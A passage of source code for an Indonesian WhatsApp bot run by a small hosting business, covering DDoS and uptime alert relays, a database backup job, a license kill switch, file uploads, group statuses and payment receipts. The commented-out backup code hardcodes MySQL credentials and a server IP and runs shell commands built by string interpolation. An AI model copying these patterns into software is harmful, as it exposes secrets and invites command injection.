                const [label, val] = line.replace('• ', '').split(': ');
                acc[label.trim()] = val?.trim();
                return acc;
            }, {});

        // Format pesan WhatsApp
        const msg = `🚨 *DDoS Notification Alert*

*🧾 Attack Summary*
• *Status:* 
${postMitigation['Status'] || '-'}

• *IPs Blocked:* 
${postMitigation['IPs Blocked'] || '-'}

• *Type:* 
${postMitigation['Attack Type'] || '-'}

• *Category:* 
${postMitigation['Attack Category'] || '-'}

• *Strategy:* 
${postMitigation['Blocking Strategy'] || '-'}


*📊 Pre-Mitigation Stats*
• *Packets/s (PPS):* 
${preMitigation['Packets/s (PPS)'] || '-'}

• *Megabits/s (Mbps):* 
${preMitigation['Megabits/s (Mbps)'] || '-'} Mbps

• *CPU Usage:* 
${preMitigation['CPU Usage'] || '-'}

${timestamp}

*Protect By Pablo Secure 🛡️*`;

        await pablo.sendMessage(GROUP_ID2, { 
        text: msg, 
        contextInfo: { 
            externalAdReply: { 
                showAdAttribution: true, 
                title: `PabloCloud DDoS Alert ⚠️️️`, 
                containsAutoReply: true, 
                mediaType: 1, 
                body: `${hariini}`,
                thumbnailUrl: "https://files.catbox.moe/5p8aw5.jpg", 
                renderLargerThumbnail: true,
                mediaUrl: "https://protect.pablocloud.biz.id", 
                sourceUrl: "https://protect.pablocloud.biz.id"
            },
            body:
            proto.Message.InteractiveMessage.Body.create({
                        text: msg
                    }),
            footer: proto.Message.InteractiveMessage.Footer.create({
                        text: `By PabloDev`
                    }),
        },
        
        headerType: 1
    }, { quoted: blonet });

        res.json({ status: 'Pesan rapi dikirim ke grup' });
    } catch (err) {
        console.error('❌ Gagal kirim notifikasi:', err);
        res.status(500).json({ error: 'Gagal kirim notifikasi' });
    }
});
        
app.post('/uptime-kuma', async (req, res) => {
    const timestamp = getWIBTimestamp();

    try {
        const payload = req.body;
        const msgRaw = payload?.msg || '-';

        // Ambil status dari dalam [🔴 Down] pakai regex
        const statusMatch = msgRaw.match(/\[(🔴|✅|🟡)\s*(Up|Down|Pending)\]/i);
        const statusClean = statusMatch ? `${statusMatch[1]} ${statusMatch[2]}` : 'N/A';

        const monitor = payload?.monitor || {};
        const heartbeat = payload?.heartbeat || {};

        const monitorName = monitor.name || 'Unknown';
        const monitorUrl = monitor.url || 'N/A';
        const koneksiStatus = heartbeat.status || 'N/A';
        const ping = heartbeat.ping || 'N/A';

        const msg = `*📡 Monitor:*
${monitorName}
        
*🧾 Status:*
${statusClean}

*By PabloUptime 🚀️*`;

        await pablo.sendMessage(GROUP_ID3, {
            text: msg,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `PabloCloud Uptime Alert 🚨`,
                    containsAutoReply: true,
                    mediaType: 1,
                    body: `${hariini}`,
                    thumbnailUrl: "https://files.catbox.moe/5p8aw5.jpg",
                    renderLargerThumbnail: true,
                    mediaUrl: "https://uptime.pablocloud.biz.id",
                    sourceUrl: "https://uptime.pablocloud.biz.id"
                },
                body: proto.Message.InteractiveMessage.Body.create({
                    text: msg
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `By PabloDev`
                }),
            },
            headerType: 1
        }, { quoted: blonet });

        res.json({ status: 'Notifikasi Uptime Kuma dikirim ke WhatsApp' });
    } catch (error) {
        console.error('❌ Gagal kirim notifikasi Uptime Kuma:', error);
        res.status(500).json({ error: 'Gagal proses webhook Uptime Kuma' });
    }
});*/

/*app.post('/premium', async (req, res) => {
    const timestamp = getWIBTimestamp();

    try {
        const payload2 = req.body;
        const embeds2 = payload2.embeds;

        if (!Array.isArray(embeds2) || embeds2.length === 0) {
            return res.status(400).json({ error: 'Embed tidak ditemukan di payload' });
        }

        const fields2 = embeds2[0].fields || [];
        const getField2 = (name) => fields2.find(f => f.name.includes(name))?.value || '-';

        const preMitigation2 = getField2('Pre-Mitigation Stats')
            *///.replace(/\*\*/g, '')
            /*.split('\n')
            .reduce((acc, line) => {
                const [label, val] = line.replace('• ', '').split(': ');
                acc[label.trim()] = val?.trim();
                return acc;
            }, {});

        const postMitigation2 = getField2('Post-Mitigation Results')
            *///.replace(/\*\*/g, '')
            /*.split('\n')
            .reduce((acc, line) => {
                const [label, val] = line.replace('• ', '').split(': ');
                acc[label.trim()] = val?.trim();
                return acc;
            }, {});

        const msg2 = `🚨 *DDoS Notification Alert*

*🧾 Attack Summary*
• *Status:* 
${postMitigation2['Status'] || '-'}

• *IPs Blocked:* 
${postMitigation2['IPs Blocked'] || '-'}

• *Type:* 
${postMitigation2['Attack Type'] || '-'}

• *Category:* 
${postMitigation2['Attack Category'] || '-'}

• *Strategy:* 
${postMitigation2['Blocking Strategy'] || '-'}


*📊 Pre-Mitigation Stats*
• *Packets/s (PPS):* 
${preMitigation2['Packets/s (PPS)'] || '-'}

• *Megabits/s (Mbps):* 
${preMitigation2['Megabits/s (Mbps)'] || '-'} Mbps

• *CPU Usage:* 
${preMitigation2['CPU Usage'] || '-'}

${timestamp}

*Protect By Pablo Secure 🛡️*`;

        await pablo.sendMessage(GROUP_ID2, { 
            text: msg2, 
            contextInfo: { 
                externalAdReply: { 
                    showAdAttribution: true, 
                    title: `PabloCloud DDoS Alert ⚠️️️`, 
                    containsAutoReply: true, 
                    mediaType: 1, 
                    body: `${hariini}`,
                    thumbnailUrl: "https://files.catbox.moe/5p8aw5.jpg", 
                    renderLargerThumbnail: true,
                    mediaUrl: "https://protect.pablocloud.biz.id", 
                    sourceUrl: "https://protect.pablocloud.biz.id"
                },
                body:
                proto.Message.InteractiveMessage.Body.create({
                    text: msg2
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `By PabloDev`
                }),
            },
            headerType: 1
        }, { quoted: blonet });

        res.json({ status: 'Pesan rapi dikirim ke grup' });
    } catch (err) {
        console.error('❌ Gagal kirim notifikasi:', err);
        res.status(500).json({ error: 'Gagal kirim notifikasi' });
    }
});*/

/*const MYSQL_USER = "admindb";
const MYSQL_PASS = "admin";
const MYSQL_HOST = "147.139.244.154";

async function backupdb(m, pablo, blonet) {
  try {
    const timeWIB = moment().tz("Asia/Jakarta").format("DD-MM-YY HH:mm");
    const hariini = moment().tz("Asia/Jakarta").format("dddd, D MMMM YYYY");
    const outDir = path.resolve(__dirname, "tmp_backup", `db-${timeWIB}`);
    const zipPath = `${outDir}.zip`;

    if (!fs.existsSync(outDir)) fs.mkdirSync(outDir, { recursive: true });

    console.log("🔄 Mulai backup database...");

    const showDbCmd = `mysql -u${MYSQL_USER} -p${MYSQL_PASS} -h${MYSQL_HOST} -e "SHOW DATABASES LIKE 's%';" -s --skip-column-names`;

    exec(showDbCmd, async (err, stdout) => {
      if (err) return console.error("❌ Gagal ambil database:", err);

      const dbList = stdout.trim().split("\n").filter(Boolean);
      if (!dbList.length) return console.log("⚠️ Tidak ada database awalan 's'.");

      for (const db of dbList) {
        const sqlPath = path.join(outDir, `${db}.sql`);
        const dumpCmd = `mysqldump -u${MYSQL_USER} -p${MYSQL_PASS} -h${MYSQL_HOST} ${db} > "${sqlPath}"`;
        try {
          await execPromise(dumpCmd);
          console.log(`✅ Dump selesai: ${db}`);
        } catch (e) {
          console.error(`❌ Gagal dump ${db}:`, e);
        }
      }

      // Buat ZIP dari semua .sql
      const output = fs.createWriteStream(zipPath);
      const archive = archiver("zip", { zlib: { level: 9 } });

      archive.pipe(output);
      fs.readdirSync(outDir).forEach(file => {
        archive.file(path.join(outDir, file), { name: file });
      });

      await archive.finalize();

      console.log("✅ Backup selesai. Mengirim ke WA...");

      await pablo.sendMessage(
        "62857552519341@s.whatsapp.net",
        {
          document: fs.readFileSync(zipPath),
          fileName: `backup_db-${timeWIB}.zip`,
          mimetype: "application/zip"
        },
        { quoted: m }
      );

      const msg = `🚨 *Backup Notification*\n\n*Database Berhasil Di Backup Pada* ${timeWIB} WIB.\n\n*AutoBackup By Pablo Secure 🔁️*`;

      await pablo.sendMessage(
        GROUP_ID2,
        {
          text: msg,
          contextInfo: {
            externalAdReply: {
              showAdAttribution: true,
              title: `PabloCloud Auto Backup️️️`,
              containsAutoReply: true,
              mediaType: 1,
              body: hariini,
              thumbnailUrl: "https://files.catbox.moe/5p8aw5.jpg",
              renderLargerThumbnail: true,
              mediaUrl: "https://protect.pablocloud.biz.id",
              sourceUrl: "https://protect.pablocloud.biz.id"
            }
          }
        },
        { quoted: blonet }
      );

      // 🔥 Hapus semua file .sql & direktori & zip
      fs.rmSync(outDir, { recursive: true, force: true });
      if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);

      console.log("🧹 File backup dibersihkan!");
    });
  } catch (err) {
    console.error("❌ Error utama:", err);
  }
}

// Promisify exec
function execPromise(cmd) {
  return new Promise((resolve, reject) => {
    exec(cmd, (err, stdout, stderr) => {
      if (err) reject(stderr || err);
      else resolve(stdout);
    });
  });
}

cron.schedule("0 11 * * *", () => {
  const now = moment().tz("Asia/Jakarta");
  console.log(`🚀 Menjalankan auto-backup: ${now.format("HH:mm")} WIB`);
  backupdb(m, pablo, blonet); // sesuaikan args jika pakai WA bot
}, {
  timezone: "Asia/Jakarta"
});*/

function loadGroupBan() {
  try {
    const data = fs.readFileSync('./database/groupban.json');
    return JSON.parse(data);
  } catch (e) {
    return { bannedGroups: [] }; // fallback jika file tidak ada atau rusak
  }
}

function saveGroupBan(data) {
  fs.writeFileSync('./database/groupban.json', JSON.stringify(data, null, 2));
}

function isGroupBanned(groupId) {
  const data = loadGroupBan();
  return data.bannedGroups.includes(groupId);
}

function addGroupBan(groupId) {
  const data = loadGroupBan();
  if (!data.bannedGroups.includes(groupId)) {
    data.bannedGroups.push(groupId);
    saveGroupBan(data);
    return true;
  }
  return false;
}

function removeGroupBan(groupId) {
  const data = loadGroupBan();
  if (data.bannedGroups.includes(groupId)) {
    data.bannedGroups = data.bannedGroups.filter(id => id !== groupId);
    saveGroupBan(data);
    return true;
  }
  return false;
}
        

function loadAntiLinkDB() {
    if (!fs.existsSync(antilinkPath)) return [];
    return JSON.parse(fs.readFileSync(antilinkPath));
}

function saveAntiLinkDB(data) {
    fs.writeFileSync(antilinkPath, JSON.stringify(data, null, 2));
}
        
function parseJid(m, text) {
    const ctx = m.message?.extendedTextMessage?.contextInfo;
    const mention = ctx?.mentionedJid?.[0];

    const quoted = 
        m.quoted?.sender ||
        m.message?.extendedTextMessage?.contextInfo?.participant ||
        m.message?.conversationContext?.participant ||
        null;

    if (mention) return mention;

    if (quoted) return quoted;

    if (text) {
        let raw = text.trim();

        if (/@(lid|s\.whatsapp\.net)$/.test(raw)) return raw;

        if (raw.startsWith("@")) raw = raw.slice(1);

        let num = raw.replace(/[^0-9]/g, "");
        if (!num) return null;

        if (num.length > 11) return num + "@lid";

        if (num.startsWith("0")) num = "62" + num.slice(1);
        if (!num.startsWith("62")) num = "62" + num;

        return num + "@s.whatsapp.net";
    }

    return null;
}

const lokasireng = './database/listgc.json';
if (!fs.existsSync(lokasireng)) fs.writeFileSync(lokasireng, JSON.stringify([]));
let listgc = JSON.parse(fs.readFileSync(lokasireng));

const baileys = require("@whiskeysockets/baileys");
async function groupStatus(conn, jid, content) {
    const { backgroundColor } = content;
    delete content.backgroundColor;

    // Generate isi pesan berdasarkan media/text
    const inside = await baileys.generateWAMessageContent(content, {
        upload: conn.waUploadToServer,
        backgroundColor
    });

    // WA butuh messageSecret untuk groupStatusMessageV2
    const messageSecret = crypto.randomBytes(32);

    // Bangun pesan group status V2
    const msg = baileys.generateWAMessageFromContent(
        jid,
        {
            messageContextInfo: { messageSecret },
            groupStatusMessageV2: {
                message: {
                    ...inside,
                    messageContextInfo: { messageSecret }
                }
            }
        },
        {}
    );

    // Kirim pesan
    await conn.relayMessage(jid, msg.message, {
        messageId: msg.key.id
    });

    return msg;
}

async function streamToBuffer(stream) {
    const chunks = [];
    for await (const chunk of stream) chunks.push(chunk);
    return chunks;
}

async function groupLabel(chat, label) {
try {
await pablo.relayMessage(chat, {
protocolMessage: {
type: 30,
memberLabel: { label }
}
}, {
additionalNodes: [
{
tag: "meta",
attrs: {
tag_reason: "user_update",
appdata: "member_tag"
}
}
]
})
} catch (e) {
console.log("Label Error:", e)
}
}
        
        if (isBan) return reply('You are banned from using this bot.');
        
        if (isGroupBanned(from)) {
        if (!isOwner && !isStaff) return; // blokir semua akses user biasa di grup yg dibanned
        }

        switch (command) {
case 'suspend': {
  const ownerID = '6287790423579';
  if (m.sender.split('@')[0] !== ownerID) return reply('❌ Hanya Pablo yang bisa suspend bot.');

  const axios = require('axios');
  const apikey = global.AuthKey; // Ganti dengan apikey bot kamu
  const SUSPEND_TOKEN = 'pablo01';

  try {
    const { data } = await axios.get('https://api.ipify.org?format=json');
    const ip = data.ip;

    const input = text || '';
    const type = input.split('|')[0].trim().toLowerCase();
    const reason = input.split('|')[1]?.trim() || 'apikey anda sudah expired, silakan hubungi Pablo untuk perpanjangan.';

    async function suspendIP() {
      const res = await axios.get(`https://apikey-mu.vercel.app/ip-bot?ip=${ip}&token=${SUSPEND_TOKEN}`);
      if (res.data?.success) {
        reply(`🚫 IP (${res.data.ip}) berhasil disuspend.`);
      } else {
        reply('❌ Gagal suspend IP.');
      }
    }

    async function suspendKey() {
      const res = await axios.get(`https://apikey-mu.vercel.app/apikey-bot?apikey=${apikey}&reason=${encodeURIComponent(reason)}&token=${SUSPEND_TOKEN}`);
      if (res.data?.success) {
        reply(`🔒 API Key (${res.data.apikey}) berhasil disuspend.\n📝 Alasan: ${reason}`);
      } else {
        reply('❌ Gagal suspend API Key.');
      }
    }

    if (type === 'ip') {
      await suspendIP();
    } else if (type === 'apikey') {
      await suspendKey();
    } else if (type === 'all') {
      await suspendIP();
      await suspendKey();
    } else {
      return reply(`⚠️ Format salah.\nContoh:\n.suspend ip\n.suspend apikey|alasan\n.suspend all|alasan`);
    }

    setTimeout(() => process.exit(), 2500);
  } catch (e) {
    console.error(e);
    reply('❌ Gagal suspend:\n' + e.message);
  }
}
break;

case 'tourl': {
    try {
        const ctx = m.message?.extendedTextMessage?.contextInfo;
        const quoted = ctx?.quotedMessage;

        if (!quoted) return reply(`❌ *Reply file untuk diupload!*`);

        // Ambil tipe utama media
        const qType = Object.keys(quoted)[0];
        const mediaData =
            quoted?.imageMessage ||
            quoted?.videoMessage ||
            quoted?.audioMessage ||
            quoted?.documentMessage ||
            quoted?.stickerMessage;

        if (!mediaData) return reply(`❌ *Media tidak dikenali atau tidak didukung!*`);

        const mime = mediaData.mimetype || 'application/octet-stream';

        //reply(`📥 *Downloading file...*`);

        // Download media
        const stream = await downloadContentFromMessage(mediaData, qType.replace("Message",""));
        const chunks = [];
        for await (const c of stream) chunks.push(c);
        const buffer = Buffer.concat(chunks);

        reply(`📤 *Uploading...*`);

        const axios = require("axios");
        const FormData = require("form-data");
        const form = new FormData();

        const ext = mime.split("/")[1] || "bin";
        const filename = `upload_${Date.now()}.${ext}`;

        // Kirim file
        form.append("file", buffer, {
            filename,
            contentType: mime
        });

        const upload = await axios.post(
            "https://boxup.pablocloud.my.id/upload",
            form,
            { headers: form.getHeaders() }
        );

        const data = upload.data;

        // Ambil data API
        const file      = data.file || filename;
        const size      = data.size || "-";
        const mimeType  = data.mimeType || mime;
        const result    = data.result || "-";
        const storage   = data.storage || "-";
        const decrypt   = data.decryptkey || data.key || null;
        const creator   = data.creator || "Server";
        
        const storageUrl = data.storage || "-";
let cdnName = "-";

if (storageUrl && storageUrl !== "-") {
    try {
        const url = new URL(storageUrl);
        const host = url.hostname; 

        const match = host.match(/^(cdn[0-9]+)/i);
        cdnName = match ? match[1] : host;
    } catch (e) {
        cdnName = "-";
    }
}

        let text = 
`✅ *UPLOAD BERHASIL*

📄 *Nama File:* ${file}
📦 *Ukuran:* ${size}
🧩 *Type:* ${mimeType}
📁 *Server:* ${cdnName}
🔗 *Hasil:* 
> ${result}

⏳ *Note:* File membutuhkan waktu *1-5 menit* agar bisa diakses.
`;

        await pablo.sendMessage(m.chat, { text }, { quoted: blonet });

        // Optional copy button
        const buttons = [
            {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                    id: "copy_link",
                    display_text: "Copy Result URL",
                    copy_code: result
                })
            }
        ];

        // await butin(text, buttons)

    } catch (e) {
        console.log(e);
        reply(`Error Cik: ${e}`);
    }
}
break;
 
case 'label': {
if (!isOwner) return reply("Khusus Owner")
if (args.length === 0) return reply(`Kirim perintah:\n${prefix+command} Text`)
const text = args.join(' ');
await groupLabel(m.chat, text)
await reply("Sukses ✅")
}
break;

case 'upswgc':
case 'swgc':
case 'swgrup': {
    if (!isOwner) return reply('❌ Kamu bukan owner!');
    let chatId = m.chat;
    const { message } = m;

    // Ambil contextInfo untuk quotedMessage
    const ctx = message?.extendedTextMessage?.contextInfo || null;
    const quotedMessage = ctx?.quotedMessage || null;

    // Deteksi tipe
    const mainType = Object.keys(message)[0] || 'Tidak ada';
    const quotedType = quotedMessage ? Object.keys(quotedMessage)[0] : null;

    // Mimetype dari quoted media
    const mimeImage = quotedMessage?.imageMessage?.mimetype || '';
    const mimeVideo = quotedMessage?.videoMessage?.mimetype || '';
    const mimeAudio = quotedMessage?.audioMessage?.mimetype || '';
    const mimeDoc = quotedMessage?.documentMessage?.mimetype || '';

    const mimetype = mimeImage || mimeVideo || mimeAudio || mimeDoc || '';

    // Ambil caption user
    const rawText = m.text || m.body || "";
    const caption = rawText
        .replace(new RegExp(`^\\${prefix}${command}\\s*`, "i"), "")
        .trim();

    // Jika tidak ada quoted dan tidak ada caption
    if (!quotedMessage && !caption)
        return reply(
            `Reply gambar/video/audio atau tambahkan teks.\n\nContoh:\n${prefix + command} (reply media) Halo ini saya`
        );

    let payload = {};

    try {

        // ==== MEDIA (IMAGE / VIDEO / AUDIO) ====
        if (quotedMessage) {

            let mediaType = null;
            let mediaObj = null;

            if (quotedMessage.imageMessage) {
                mediaType = 'image';
                mediaObj = quotedMessage.imageMessage;

            } else if (quotedMessage.videoMessage) {
                mediaType = 'video';
                mediaObj = quotedMessage.videoMessage;

            } else if (quotedMessage.audioMessage) {
                mediaType = 'audio';
                mediaObj = quotedMessage.audioMessage;

            } else if (quotedMessage.documentMessage) {
                // Dokumen yang sebenarnya adalah media (misal audio mp3)
                if (mimeDoc.startsWith("audio/")) {
                    mediaType = 'audio';
                    mediaObj = quotedMessage.documentMessage;
                }
            }

            // Kalau media valid, download
            if (mediaType && mediaObj) {
                const stream = await downloadContentFromMessage(mediaObj, mediaType);
                const chunks = [];
                for await (const chunk of stream) chunks.push(chunk);
                const buffer = Buffer.concat(chunks);

                if (mediaType === "image") {
                    payload = { image: buffer, caption };
                } else if (mediaType === "video") {
                    payload = { video: buffer, caption };
                } else if (mediaType === "audio") {
                    payload = { audio: buffer, mimetype: "audio/mp4" };
                }
            }
        }

        // ==== TEXT SAJA ====
        if (!quotedMessage && caption) {
            payload = { text: caption };
        }

        // ==== Validasi terakhir ====
        if (!payload || Object.keys(payload).length === 0) {
            return reply(
                `Reply gambar/video/audio atau tambahkan teks.\n\nContoh:\n${prefix + command} (reply media) Halo ini saya`
            );
        }

        // === KIRIM STATUS GROUP ===
        await groupStatus(pablo, chatId, payload);

        await pablo.sendMessage(chatId, {
            react: { text: "✅", key: m.key }
        });

    } catch (e) {

        console.log("ERROR UPSWGC:", e);

        await pablo.sendMessage(chatId, {
            react: { text: "❌", key: m.key }
        });

        reply("❌ Error saat mengirim status grup.");
    }
}
break;

case 'upswgcv2':
case 'swgcv2':
case 'swgrupv2': {
    if (!isOwner) return reply('❌ Kamu bukan owner!');
    const listPath = './database/listgc.json';

// Jika file tidak ada, buat otomatis
if (!fs.existsSync(listPath)) {
    fs.writeFileSync(listPath, JSON.stringify([], null, 2));
}

// Load list
let listgc = [];
try {
    listgc = JSON.parse(fs.readFileSync(listPath));
    if (!Array.isArray(listgc)) listgc = [];
} catch {
    listgc = [];
}

if (listgc.length === 0) {
    return reply("❌ *Belum ada grup di listgc.*\nTambahkan dengan *.addlistgc*");
}

    let chatId = m.chat;
    const { message } = m;

    const ctx = message?.extendedTextMessage?.contextInfo || null;
    const quoted = ctx?.quotedMessage || null;

    const caption = (m.text || "")
        .replace(new RegExp(`^\\${prefix}${command}\\s*`, "i"), "")
        .trim();

    let payload = {};

    try {
        // ==== Jika reply media ====
        if (quoted) {
            let type = Object.keys(quoted)[0];

            // Download stream media
            const mediaType =
                type.includes("image") ? "image" :
                type.includes("video") ? "video" :
                type.includes("audio") ? "audio" :
                null;

            const mediaObj = quoted[`${mediaType}Message`];

            if (mediaType && mediaObj) {
                const stream = await downloadContentFromMessage(mediaObj, mediaType);

                const buffer = await new Promise(async (resolve, reject) => {
                    const chunks = [];
                    try {
                        for await (const chunk of stream) chunks.push(chunk);
                        resolve(Buffer.concat(chunks));
                    } catch (err) {
                        reject(err);
                    }
                });

                if (mediaType === "image") payload = { image: buffer, caption };
                if (mediaType === "video") payload = { video: buffer, caption };
                if (mediaType === "audio") payload = { audio: buffer, mimetype: "audio/mp4" };
            }
        }

        // ==== Jika hanya text ====
        if (!quoted && caption) {
            payload = { text: caption };
        }

        if (!Object.keys(payload).length) {
            return reply(`Reply gambar/video/audio atau kirim teks.\n\nContoh:\n${prefix + command} Halo semua`);
        }

        // ==== Kirim ke semua grup dalam listgc ====
        let gagal = [];
        for (const gc of listgc) {
    try {
        await groupStatus(pablo, gc, payload);
    } catch (err) {
        console.log(`Gagal mengirim ke ${gc}`, err);
    }
}

        await pablo.sendMessage(chatId, {
            react: { text: gagal.length ? "⚠️" : "✅", key: m.key }
        });

        reply(
            gagal.length ?
            `⚠️ Ada ${gagal.length} grup gagal menerima SW.` :
            `✅ Status berhasil dikirim ke semua grup!`
        );

    } catch (err) {
        console.log("ERROR UPSWGC:", err);
        reply("❌ Terjadi kesalahan saat mengirim SW.");
    }
}
break;

case 'addlistgc': {
    if (!isGroup) return reply("❌ Command ini hanya bisa di dalam grup.");
    if (!isOwner) return reply('❌ Kamu bukan owner!');

    if (!listgc.includes(m.chat)) {
        listgc.push(m.chat);
        fs.writeFileSync('./database/listgc.json', JSON.stringify(listgc, null, 2));
        reply("✅ Grup ini berhasil ditambahkan ke list SWGC.");
    } else {
        reply("⚠️ Grup ini sudah ada dalam list.");
    }
}
break;

case 'dellistgc': {
    if (!isGroup) return reply("❌ Command ini hanya bisa di dalam grup.");
    if (!isOwner) return reply('❌ Kamu bukan owner!');

    if (listgc.includes(m.chat)) {
        listgc = listgc.filter(g => g !== m.chat);
        fs.writeFileSync('./database/listgc.json', JSON.stringify(listgc, null, 2));
        reply("🗑️ Grup ini berhasil dihapus dari list SWGC.");
    } else {
        reply("⚠️ Grup ini tidak ada dalam list.");
    }
}
break;

case 'pinginfo': {
    if (!isOwner && !isStaff) return reply('Perintah ini hanya bisa digunakan oleh owner dan admin.');
  try {
    if (!args[0]) return reply(`Kirim perintah:\n${prefix+command} IP`)

    const ip = args[0];

    const countryMap = {
      "id2.node.check-host.net": "Indonesia",
      "sg1.node.check-host.net": "Singapore",
      "de4.node.check-host.net": "Germany",
      "us1.node.check-host.net": "USA"
    };

    const params = new URLSearchParams();
    params.append("host", ip);
    params.append("node", "id2.node.check-host.net");
    params.append("node", "sg1.node.check-host.net");
    params.append("node", "de4.node.check-host.net");
    params.append("node", "us1.node.check-host.net");

    const submit = await axios.get("https://check-host.net/check-ping", {
      headers: { "Accept": "application/json" },
      params
    });

    const requestId = submit.data.request_id;
    if (!requestId) throw new Error("Tidak mendapatkan request_id");

    const avgPing = {};
    const initialText = `*PING INFO: ${ip}*\n\n> [ Sedang menghitung latency, mohon tunggu... ]`;
    const sentMsg = await pablo.sendMessage(m.chat, { text: initialText }, { quoted: blonet });
    const messageKey = sentMsg.key;

    for (let attempt = 1; attempt <= 7; attempt++) {
      await new Promise(r => setTimeout(r, 1000));
      const res = await axios.get(`https://check-host.net/check-result/${requestId}`, {
        headers: { "Accept": "application/json" }
      });

      const resultData = res.data;
      let allDone = true;

      for (const node in resultData) {
        if (avgPing[countryMap[node]]) continue;

        const nodeData = resultData[node];
        if (!Array.isArray(nodeData) || !Array.isArray(nodeData[0]) || nodeData[0].length === 0) {
          allDone = false;
          continue;
        }

        const flat = nodeData[0].flat(Infinity);
        const values = flat.filter((v, i) => i % 2 === 1 && typeof v === "number");
        if (values.length > 0) {
          const sum = values.reduce((a, b) => a + b, 0);
          avgPing[countryMap[node]] = Math.round((sum / values.length) * 1000);
        } else {
          allDone = false;
        }
      }

      const text = `*PING INFO: ${ip}*\n\n` +
  `> *Indonesian:*\n> [ ${avgPing.Indonesia != null ? avgPing.Indonesia + 'ms' : 'Timeout'} ]\n\n` +
  `> *Singapore:*\n> [ ${avgPing.Singapore != null ? avgPing.Singapore + 'ms' : 'Timeout'} ]\n\n` +
  `> *Germany:*\n> [ ${avgPing.Germany != null ? avgPing.Germany + 'ms' : 'Timeout'} ]\n\n` +
  `> *USA:*\n> [ ${avgPing.USA != null ? avgPing.USA + 'ms' : 'Timeout'} ]`;

      await pablo.sendMessage(m.chat, { text, edit: messageKey }, { quoted: blonet });

      if (allDone) break;
    }

    /*if (Object.keys(avgPing).length === 0) {
      await reply('❌ Gagal Mendapatkan Info. Mungkin Anda sudah mencapai batas limit cek untuk IP ini. Silakan tunggu beberapa saat dan coba lagi.');
    }*/

  } catch (err) {
    await reply('❌ Gagal Mendapatkan Ping. Mungkin Anda sudah mencapai batas limit cek untuk IP ini. Silakan tunggu beberapa saat dan coba lagi.');
  }
}
break;

case 'pditerima': {
    if (!isOwner) return;

    let parts = text.split('|');
    if (!text || parts.length < 2) {
        return reply('Format salah! Gunakan: .pditerima Produk|Nominal');
    }

    let nominal = parts.pop().trim();
    let produk = parts.join('|').trim();
    let nominalNormal = nominal;

    nominal = nominal.replace(/\D/g, '');
    nominal = nominal.replace(/\B(?=(\d{3})+(?!\d))/g, '.');

    const tanggal = new Date();
    const tanggalFormatted = `${tanggal.getDate()} ${tanggal.toLocaleString('id-ID', { month: 'long' })} ${tanggal.getFullYear()}`;

    const fs = require('fs');
    const path = './database/idtrx.json';
    let idtrx = '00000';

    try {
        if (fs.existsSync(path)) {
            const data = JSON.parse(fs.readFileSync(path, 'utf-8'));
            if (data.idtrx) idtrx = data.idtrx;
        }
    } catch (err) {
        console.error('Error membaca idtrx.json:', err);
    }

    const idtrxStruk = idtrx;

    const idtrxNumber = parseInt(idtrx, 10) + 1;
    const idtrxUpdated = idtrxNumber.toString().padStart(5, '0');

    try {
        fs.writeFileSync(path, JSON.stringify({ idtrx: idtrxUpdated }));
    } catch (err) {
        console.error('Error menulis idtrx.json:', err);
    }

    const pesan = `*Pembayaran Berhasil Diterima ✅*\n\n` +
        `Terima kasih telah melakukan pembayaran di *GalaxyHost.* Kami konfirmasi bahwa pembayaran Anda telah *berhasil diterima.*\n\n` +
        `*Detail Pesanan Anda*\n` +
        `*Produk/Layanan:* ${produk}\n` +
        `*Nominal:* Rp${nominal}\n` +
        `*Tanggal Pembayaran:* ${tanggalFormatted}\n\n` +
        `Layanan Anda kini sedang diproses dan akan segera aktif.\n` +
        `Jika ada pertanyaan, *silakan hubungi tim support kami.*\n\n` +
        `Terima kasih telah mempercayakan kebutuhan hosting Anda kepada *GalaxyHost!*\n\n` +
        `Salam hangat,\n*Tim GalaxyHost*`;

    const buttons = [
      { 
        buttonId: `.struk ${idtrxStruk}|${nominalNormal}|0|-|${produk}`, 
        buttonText: { displayText: '📝 Cetak Struk' }, 
        type: 1 
      }
    ];

    await reply(pesan);
    await trxstore(`TRX: ${idtrxStruk}`, buttons);
}
break;

case 'setidtrx': {
    if (!isOwner) return reply('Hanya owner yang bisa menggunakan perintah ini.');

    if (!args[0] || !/^\d+$/.test(args[0])) {
        return reply('Format salah! Gunakan: .setidtrx NOMOR (contoh: .setidtrx 347)');
    }

    const fs = require('fs');
    const path = './database/idtrx.json';
    const newId = args[0]; // bebas digit

    try {
        fs.writeFileSync(path, JSON.stringify({ idtrx: newId }));
        reply(`✅ ID TRX berhasil diubah menjadi: ${newId}`);
    } catch (err) {
        console.error('Error menulis idtrx.json:', err);
        reply('❌ Gagal mengubah ID TRX.');
    }
}
break;

case 'cekidtrx': {
    if (!isOwner) return reply('Hanya owner yang bisa menggunakan perintah ini.');

    const fs = require('fs');
    const path = './database/idtrx.json';

    if (!fs.existsSync(path)) {
        return reply('⚠️ ID TRX belum di-set.');
    }

    try {
        const data = JSON.parse(fs.readFileSync(path, 'utf-8'));
        const idtrx = data.idtrx;
        if (!idtrx) return reply('⚠️ ID TRX belum di-set.');
        reply(`ℹ️ ID TRX saat ini: ${idtrx}`);
    } catch (err) {
        console.error('Error membaca idtrx.json:', err);
        reply('❌ Gagal membaca ID TRX.');
    }
}
break;

case "s":
case "stiker":
case "sticker": {
    const {
  Sticker,
  StickerTypes
} = require("wa-sticker-formatter");
    const { message } = m;
    const ctx = message?.extendedTextMessage?.contextInfo || null;
    const quotedMessage = ctx?.quotedMessage || null;

    if (!quotedMessage) 
        return reply(`Kirim/reply foto atau video dengan caption *${prefix + command}*`);

    // Detect mimetype
    const mimeImg  = quotedMessage?.imageMessage?.mimetype || "";
    const mimeVid  = quotedMessage?.videoMessage?.mimetype || "";
    const mimeType = mimeImg || mimeVid;

    if (!mimeType)
        return reply(`Kirim/reply foto atau video dengan caption *${prefix + command}*`);

    // Duration check
    if (mimeVid && quotedMessage?.videoMessage?.seconds > 20)
        return reply("❌ Video maksimal 20 detik!");

    await pablo.sendMessage(m.chat, {
        react: { text: "🕒", key: m.key }
    });

    try {
        // Download media
        const mediaMsg = mimeImg ? quotedMessage.imageMessage : quotedMessage.videoMessage;
        const dlType = mimeImg ? "image" : "video";

        const stream = await downloadContentFromMessage(mediaMsg, dlType);
        let buffer = Buffer.concat([]);

        for await (const chunk of stream) {
